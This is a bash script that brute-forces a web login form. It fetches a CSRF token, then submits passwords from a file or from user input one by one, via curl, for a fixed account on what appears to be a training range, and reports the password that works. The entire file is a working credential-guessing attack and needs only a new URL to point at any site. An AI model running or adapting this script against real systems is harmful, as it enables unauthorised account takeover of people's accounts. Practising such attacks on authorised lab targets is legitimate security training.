#!/bin/bash



# Replace these with your actual login page URL and username

login_url="https://vuln.whizrange.in/login.php"

username="peter@whizrange.com"



# Check if the passwords file exists

if [ -f "passwords.txt" ]; then

    passwords_file="passwords.txt"

else

    passwords_file=""

fi



# If passwords file exists, read passwords from it, else prompt user for passwords

if [ -n "$passwords_file" ]; then

    passwords=($(< "$passwords_file"))

else

    echo "No passwords file found. Please enter passwords (one per line). Press Ctrl+D when done."

    passwords=()

    while IFS= read -r line; do

        passwords+=("$line")

    done

fi



# Fetch the login page to retrieve any necessary cookies or tokens

curl_response=$(curl -c cookies.txt -s -w "%{http_code}" "$login_url")

csrf_token=$(grep -o 'csrf_token=[^;]*' cookies.txt | cut -d'=' -f2)  # Replace with the actual cookie name if needed



# Loop through passwords

for password in "${passwords[@]}"; do

    # Form data to be sent in the POST request

    login_data="email=$username&pass=$password&csrf_token=$csrf_token"  # Replace with the actual CSRF token field name if needed



    # Send the POST request to login

    login_response=$(curl -b cookies.txt -s -w "%{http_code}" -X POST -d "$login_data" -L "$login_url")



    # Check the HTTP response code to verify the login

    if [ "$login_response" != "200" ]; then

        # Check the content of the redirected page to determine success

        if [[ $(curl -b cookies.txt -s -L "$login_url") =~ "Cover your page" ]]; then

            echo "Login successful with password: $password"

            exit 0

        fi

    fi

done



# If no password worked

echo "Login failed with all provided passwords."



# Now you can use the same cookies file to make authenticated requests to other pages on the website